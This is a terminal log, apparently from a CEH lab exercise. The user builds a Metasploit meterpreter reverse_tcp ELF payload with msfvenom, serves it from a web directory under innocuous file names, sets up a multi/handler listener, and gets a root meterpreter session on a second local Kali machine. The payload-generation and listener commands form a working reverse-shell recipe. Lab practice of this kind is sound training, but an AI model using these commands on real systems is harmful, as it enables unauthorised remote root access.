root@root:~/Desktop/GIT/CEH# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.224 -f elf -o /var/www/html/testforkali.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
Saved as: /var/www/html/testforkali.elf
root@root:~/Desktop/GIT/CEH# service postgreslq start
Failed to start postgreslq.service: Unit postgreslq.service not found.
root@root:~/Desktop/GIT/CEH# service postgresql start
root@root:~/Desktop/GIT/CEH# msfconsole -q
msf5 > use multi/handler
msf5 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.0.224
LHOST => 192.168.0.224
msf5 exploit(multi/handler) > set LPORT 5566
LPORT => 5566
msf5 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.0.224:5566 
msf5 exploit(multi/handler) > 
[1]+  Stopped                 msfconsole -q
root@root:~/Desktop/GIT/CEH# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.224 LPORT=2345 -f elf -o /var/www/html/testforkali.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
Saved as: /var/www/html/testforkali.elf
root@root:~/Desktop/GIT/CEH# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.224 LPORT=2345 -f elf -o /var/www/html/hello.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
Saved as: /var/www/html/hello.elf
root@root:~/Desktop/GIT/CEH# service postgresql start
root@root:~/Desktop/GIT/CEH# msfconsole -q
msf5 > use multi/handler
msf5 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.0.224
LHOST => 192.168.0.224
msf5 exploit(multi/handler) > set LPORT 2345
LPORT => 2345
msf5 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.0.224:2345 
msf5 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                            Payload opts
  --  ----                    -------                            ------------
  0   Exploit: multi/handler  linux/x86/meterpreter/reverse_tcp  tcp://192.168.0.224:2345

msf5 exploit(multi/handler) > s
[*] Sending stage (985320 bytes) to 192.168.0.170
e[*] Meterpreter session 1 opened (192.168.0.224:2345 -> 192.168.0.170:52370) at 2019-07-20 18:06:21 +0530

[-] Unknown command: s.
msf5 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                   Connection
  --  ----  ----                   -----------                                   ----------
  1         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.168.0.170  192.168.0.224:2345 -> 192.168.0.170:52370 (192.168.0.170)

msf5 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer     : 192.168.0.170
OS           : Kali kali-rolling (Linux 4.17.0-kali1-686-pae)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > cd root
[-] stdapi_fs_chdir: Operation failed: 2
meterpreter > 

